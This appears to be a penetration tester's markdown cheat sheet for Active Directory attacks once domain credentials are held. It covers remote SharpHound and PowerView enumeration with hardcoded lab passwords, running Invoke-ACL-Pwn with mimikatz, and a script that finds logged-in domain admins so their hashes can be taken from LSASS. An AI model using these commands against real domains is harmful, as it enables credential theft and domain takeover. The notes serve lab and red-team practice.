# With Domain Creds
## Run SharpHound remotely with creds
> This can be used to run any binary or powershell script remotely e.g. invoke-mimikatz

```powershell
# Switch to a world writable directory so we have permission to write files to disk
cd \windows\tasks

# the netonly command means creds are only used for network access
runas /netonly /user:lab.local\administrator cmd.exe

# verify we are using the correct creds using
net view \\WIN-8K30QDLT1AP.lab.local\

# run bloodhound remotely, pass -d argument to specify the domain name
C:\tools\SharpHound-v1.0.4\SharpHound.exe -d "lab.local"
```

## Run PowerView remotely with creds
1. Import powerview
```powershell
import-module .\powerview.ps1
```

2. Setup the credentials object
```powershell
$passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("lab.local\administrator", $passwd)


# dump domain users, output to file


# Read json and conver
Get-Content ~\desktop\domain_users.json | Out-String | ConvertFrom-Json | select samaccountname
```

## Run Invoke-ACL-Pwn Remotely with creds
```powershell
# add the -WhatIf flag to view pathes before exploitation
.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
```

## Identifying logged in domain admins on computers
> Using a local admin on these machines we can dump the LSASS to get the hash of the domain admins

```powershell
# need to be running this inside a runas session with domain creds
function Get-LoggedUser
{
    [CmdletBinding()]
    param
    (
        [string[]]$ComputerName 
    )
    foreach ($comp in $ComputerName)
    {
        $output = @{'Computer' = $comp }
        $output.UserName = (Get-WmiObject -Class win32_computersystem -ComputerName $comp).UserName
        [PSCustomObject]$output
    }
}

# Get all computer names and save them to a variable, using PowerView
# Requires admin
Import-Module C:\tools\custom\PowerView.ps1
$passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("lab.local\administrator", $passwd)
$computers = (Get-NetComputer -Credential $creds)


# Function call
Get-LoggedUser $computers
# or
Get-LoggedUser pc1215wks1,pc1215wks2,mun-dc01
```